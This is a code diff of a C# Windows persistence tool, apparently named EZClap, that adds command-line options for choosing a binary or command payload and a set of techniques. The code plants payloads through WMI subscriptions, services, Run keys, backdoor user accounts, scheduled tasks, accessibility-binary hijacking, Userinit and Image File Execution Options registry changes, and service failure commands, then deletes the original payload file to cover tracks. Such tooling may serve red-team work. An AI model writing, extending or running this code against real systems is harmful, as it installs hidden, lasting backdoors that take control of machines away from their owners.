@@ -3,6 +3,8 @@ using System.Configuration;
 using System.Collections.Specialized;
 using System.Collections.Generic;
 using Microsoft.Win32;
+using CommandLine;
+using System.IO;
 
 /*
  *  Name: EZClap 
@@ -105,80 +107,160 @@ namespace ezclap
             }
         }
 
-        private static void testConfig()
+        public class Options
         {
-            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
-            Array.ForEach(WMIName, Console.WriteLine);
+            [Option('v',"verbose", Required = false, HelpText = "Set output to verbose")]
+            public bool Verbose { get; set; }
 
-            string[] addUserPassword = Utils.parseConfig("techniques/AddUser", "password");
-            Array.ForEach(addUserPassword, Console.WriteLine);
-
-            string[] addUserGroups = Utils.parseConfig("techniques/AddUser", "groups");
-            Array.ForEach(addUserGroups, Console.WriteLine);
-
-            string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name");
-            Array.ForEach(scheduledTaskName, Console.WriteLine);
+            [Option('b', "binary", Required = false, HelpText = "Set output to verbose")]
+            public string Binary { get; set; }
+            [Option('c', "command", Required = false, HelpText = "Set output to verbose")]
+            public string Command { get; set; }
+            [Option('t', "techniques", Required = true, HelpText = "Set output to verbose")]
+            public string Techniques { get; set; }
         }
 
         static void Main(string[] args)
         {
-                       
-            // ########## Setting up #################
+
             Random rnd = new Random();
+            string originalPayloadLoc = "";
+            var binaryPayload = new List<string>();
+            var commandPayload = new List<string>();
+            var techniques = new List<string>();
+            bool binary = false;
+            bool all = false;
 
-            string originalPayloadLoc = args[0];
-            Console.WriteLine("[+] Using original payload: " + originalPayloadLoc);
+            // Parse Arguments from the Commandline 
+            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
+            {
+                // Parse Payloads. It can be either Binary or Command
+                if (o.Binary != null)
+                {
+                    Console.WriteLine("[+] Binary payload selected: " + o.Binary);
 
-            string[] payload = Utils.parseConfig("payload", "name");
-            setup(originalPayloadLoc, payload);
+                    if (File.Exists(o.Binary))
+                        Console.WriteLine("[+] File exists.");
+                    else
+                    { Console.WriteLine("[-] File does not exist."); System.Environment.Exit(1); }
 
-            // ########## Start of Implanting Persistence #################
-            // 1. Add WMI 
-            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
-            Array.ForEach(WMIName, element => Console.WriteLine(element));
-            AddWMI persistWMI = new AddWMI(WMIName, payload);
+                    originalPayloadLoc = o.Binary;
+                    binary = true;
+                    binaryPayload = Utils.parseConfig("payload", "name");
+                }
+                else if (o.Command != null)
+                {
+                    Console.WriteLine("[+] Command payload selected: " + o.Command);
+                    commandPayload.Add(o.Command);
+                }
+                else
+                {
+                    Console.WriteLine("[-] Payload not selected. Use (-b) or (-c) or payloads. Exiting.");
+                    System.Environment.Exit(1);
+                }
 
-            // 2. Add Backdoor Users 
-            string[] userNames = Utils.parseConfig("techniques/AddUser", "usernames");
-            string[] password = Utils.parseConfig("techniques/AddUser", "password");
-            string[] groups = Utils.parseConfig("techniques/AddUser", "groups");
-            AddUser persistUser = new AddUser(userNames, password[0], groups);
+                // Parse Persist techniques 
+                if (o.Techniques != null)
+                {
+                    // If all, add all techniques 
+                    if (o.Techniques == "all")
+                    {
+                        techniques.Add("wmi");
+                        techniques.Add("service");
+                        techniques.Add("user");
+                        techniques.Add("schtask");
+                        techniques.Add("access");
+                        techniques.Add("userinit");
+                        techniques.Add("failure");
+                        techniques.Add("runkey");
+                        techniques.Add("imagefile");
+                    }
+                    
+                    // If selected, only add selected techniques 
+                    else
+                    {
+                        string[] techs = o.Techniques.Split(',');
+                        foreach (var tech in techs)
+                            techniques.Add(tech);
 
-            // 3. Add RunKey registry keys 
-            string[] runKeyName = Utils.parseConfig("techniques/AddRunKey", "name");
-            AddRunKey persistRunKey = new AddRunKey(runKeyName, payload[rnd.Next(0,payload.Length-1)]);
+                    }
+                }
+
+            });
+
+            var binaryPayloadArr = binaryPayload.ToArray();
+            var commandPayloadArr = commandPayload.ToArray();
+
+            if(binary == true){
+                Console.WriteLine("[+] Binary payload selected");
+                setup(originalPayloadLoc, binaryPayloadArr);
+            }
             
 
-            // 4. Add Services 
-            string[] serviceName = Utils.parseConfig("techniques/AddService", "name");
-            AddService persistService = new AddService(serviceName, payload);
+            // Actually Execute Persistence techniques 
+            foreach (var technique in techniques)
+            {
+                if(technique == "wmi")
+                {
+                    var WMIName = Utils.parseConfig("techniques/AddWMI", "name").ToArray();
+                    Array.ForEach(WMIName, element => Console.WriteLine(element));
+                    AddWMI persistWMI = new AddWMI(WMIName, binaryPayloadArr);
+                }
 
+                if(technique == "service")
+                {
+                    var serviceName = Utils.parseConfig("techniques/AddService", "name").ToArray();
+                    AddService persistService = new AddService(serviceName, binaryPayloadArr);
+                }
+
+                if(technique == "runkey")
+                {
+                    string[] runKeyName = Utils.parseConfig("techniques/AddRunKey", "name").ToArray();
+                    AddRunKey persistRunKey = new AddRunKey(runKeyName, binaryPayloadArr[rnd.Next(0, binaryPayloadArr.Length - 1)]);
+                }
+
+                if(technique == "user")
+                {
+                    string[] userNames = Utils.parseConfig("techniques/AddUser", "usernames").ToArray();
+                    string[] password = Utils.parseConfig("techniques/AddUser", "password").ToArray(); ;
+                    string[] groups = Utils.parseConfig("techniques/AddUser", "groups").ToArray(); ;
+                    AddUser persistUser = new AddUser(userNames, password[0], groups);
+                }
+
+                if(technique == "schtask")
+                {
+                    string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name").ToArray(); ;
+                    string[] intervalString = Utils.parseConfig("techniques/AddScheduledTask", "interval").ToArray(); ;
+                    double interval = Convert.ToDouble(intervalString[0]);
+                    AddScheduledTask persistSchTask = new AddScheduledTask(scheduledTaskName, binaryPayloadArr, interval);
+                }
+
+                if(technique == "access")
+                {
+                    AddAccessibility persistAccessibility = new AddAccessibility(binaryPayloadArr);
+                }
+
+                if(technique == "userinit")
+                {
+                    Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", binaryPayloadArr[rnd.Next(0, binaryPayloadArr.Length - 1)] + ", C:\\Windows\\System32\\userinit.exe");
+                }
+
+                if(technique == "failure")
+                {
+                    List<string> servicesList = Utils.getAllServices();
+                    AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, binaryPayloadArr);
+                }
+
+                if(technique == "imagefile")
+                {
+                    modifyImageFileExec(binaryPayloadArr);
+                }
+
+                System.IO.File.Delete(originalPayloadLoc);
+
+                Console.WriteLine("[+] All persistence mechanisms are done.");
+            }
             
-            // 5. Add Scheduled Tasks 
-            string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name");
-            string[] intervalString = Utils.parseConfig("techniques/AddScheduledTask", "interval");
-            double interval = Convert.ToDouble(intervalString[0]);
-            AddScheduledTask persistSchTask = new AddScheduledTask(scheduledTaskName, payload, interval);
-
-            // 6. Add Accessibility 
-            AddAccessibility persistAccessibility = new AddAccessibility(payload);
-
-            // 7. Modify userinit 
-            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload[rnd.Next(0,payload.Length-1)] + ", C:\\Windows\\System32\\userinit.exe");
-
-            // 8. Modify FailureCommand 
-            List<string> servicesList = Utils.getAllServices();
-            AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payload);
-
-            // 9. Modify Image File Execution             
-            modifyImageFileExec(payload);
-
-
-            System.IO.File.Delete(args[0]);
-
-            Console.WriteLine("[+] All persistence mechanisms are done.");
-
-
         }
     }
 }
